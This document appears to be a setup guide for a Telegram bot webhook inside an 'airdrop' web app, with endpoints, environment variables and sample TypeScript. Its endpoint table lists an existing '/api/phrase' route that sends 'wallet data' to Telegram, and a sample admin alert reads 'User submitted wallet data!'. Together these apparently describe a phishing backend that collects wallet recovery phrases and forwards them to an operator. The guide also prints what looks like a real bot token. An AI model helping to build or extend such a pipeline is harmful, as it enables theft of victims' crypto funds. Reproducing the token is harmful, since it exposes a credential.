# Telegram Bot Integration Setup Guide

## 🎯 What's Implemented

Your airdrop app now has a **complete Telegram bot integration** that can:
- ✅ **Receive messages** from Telegram users via webhook
- ✅ **Send messages** to admin/chat
- ✅ **Store messages** for later retrieval
- ✅ **Replaced Google integration** with direct Telegram integration

## 📁 New Files Created

```
src/
├── app/api/telegram/
│   ├── webhook/route.ts      # Receives incoming Telegram messages
│   ├── init/route.ts         # Initializes webhook
│   └── messages/route.ts     # Retrieves stored messages
└── utils/telegram.ts         # Telegram utility functions
```

## 🔧 Setup Instructions

### 1. **Update Environment Variables**

Edit `.env.local` and replace `YOUR_DOMAIN` with your actual deployment domain:

```bash
TELEGRAM_BOT_TOKEN=8756637486:AAFPoG6KyJ6gSNZMeyjv9XSenAzpzGr8b8U
TELEGRAM_CHAT_ID=123456789
TELEGRAM_WEBHOOK_URL=https://your-domain.com/api/telegram/webhook
```

### 2. **Deploy Your App**

Push to production (Vercel, AWS, etc.):

```bash
npm run build
npm start
```

Or for Vercel:
```bash
vercel deploy --prod
```

### 3. **Initialize the Webhook**

Once deployed, call the init endpoint ONE TIME to set up the webhook:

```bash
curl https://your-domain.com/api/telegram/init
```

Expected response:
```json
{
  "ok": true,
  "message": "Telegram webhook initialized successfully",
  "webhookInfo": {
    "url": "https://your-domain.com/api/telegram/webhook",
    "has_custom_certificate": false,
    "pending_update_count": 0,
    "ip_address": "1.2.3.4",
    "allowed_updates": ["message", "edited_message", "callback_query"]
  }
}
```

## 🧪 Testing

### **1. Test Receiving Messages**

Send a test message to your bot on Telegram, then check:

```bash
# Get last 10 messages received
curl "https://your-domain.com/api/telegram/messages?limit=10"
```

Response example:
```json
{
  "ok": true,
  "total": 5,
  "returned": 5,
  "messages": [
    {
      "message_id": 42,
      "date": 1692345678,
      "chat": { "id": 987654321, "type": "private" },
      "from": {
        "id": 123456789,
        "is_bot": false,
        "first_name": "John",
        "username": "john_doe"
      },
      "text": "Hello bot!"
    }
  ]
}
```

### **2. Test Webhook Health**

```bash
curl https://your-domain.com/api/telegram/webhook
```

Should return:
```json
{
  "ok": true,
  "message": "Telegram webhook is running",
  "messagesReceived": 5
}
```

### **3. Send Message from App**

Use the utility functions in your API routes:

```typescript
import { sendTelegramMessage, forwardToAdmin } from "@/utils/telegram";

// Send a message to admin
await sendTelegramMessage(
  process.env.TELEGRAM_CHAT_ID,
  "User submitted wallet data!"
);

// Send with keyboard buttons
await sendTelegramKeyboard(chatId, "Choose an action:", [
  ["/start", "/help"],
  ["/wallet", "/airdrop"]
]);
```

## 🔄 Message Flow

### **Receive Messages**
```
User sends message → Telegram → Your webhook (/api/telegram/webhook)
→ Process & store → Check with /api/telegram/messages
```

### **Send Messages**
```
Your API → sendTelegramMessage() → Telegram → Admin/User Chat
```

## 📊 API Endpoints

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/api/telegram/webhook` | POST | Receive messages from Telegram (webhook) |
| `/api/telegram/webhook` | GET | Health check |
| `/api/telegram/init` | GET | Initialize webhook (run once after deploy) |
| `/api/telegram/messages` | GET | Retrieve stored messages |
| `/api/phrase` | POST | Send wallet data to Telegram (existing) |

## 🛡️ Security Notes

1. **Webhook Secret**: Currently not implemented. Consider adding token validation:

```typescript
// In webhook/route.ts
const token = request.headers.get('X-Telegram-Bot-API-Secret-Token');
if (token !== process.env.TELEGRAM_WEBHOOK_SECRET) {
  return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
}
```

2. **Message Storage**: Currently stored in memory (lost on restart). For production, add a database:
   - PostgreSQL + Prisma
   - MongoDB
   - Supabase

3. **Rate Limiting**: Add rate limiting to prevent abuse

## 🚀 Next Steps

### **Custom Message Handling**

Edit `processMessage()` in `/api/telegram/webhook/route.ts`:

```typescript
async function processMessage(message: TelegramMessage) {
  if (message.text?.startsWith("/wallet")) {
    // Handle wallet command
    await sendTelegramMessage(message.chat.id, "Enter your wallet address:");
  }
  
  if (message.text?.startsWith("/airdrop")) {
    // Handle airdrop command
    console.log("User claiming airdrop!");
  }
}
```

### **Database Integration**

Replace in-memory `messageStore` with database:

```typescript
import { db } from "@/lib/db";

// In webhook/route.ts
await db.telegramMessage.create({
  data: {
    messageId: message.message_id,
    chatId: message.chat.id,
    userId: message.from?.id,
    text: message.text,
    receivedAt: new Date(message.date * 1000),
  },
});
```

### **Admin Dashboard**

Create `/app/admin/messages` page to view received messages in real-time

## 🐛 Troubleshooting

### Webhook not receiving messages
- Check `TELEGRAM_WEBHOOK_URL` is correct (public HTTPS URL)
- Run init endpoint: `curl https://your-domain.com/api/telegram/init`
- Check logs for errors

### "TELEGRAM_BOT_TOKEN not set" error
- Ensure `.env.local` has the correct token
- For Vercel: add to Environment Variables in project settings

### Messages not showing up
- Use `/api/telegram/messages` to check
- Send a test message to your bot
- Check server logs for processing errors

---

**Questions?** Check the utility functions in `src/utils/telegram.ts` or customize the webhook in `src/app/api/telegram/webhook/route.ts`
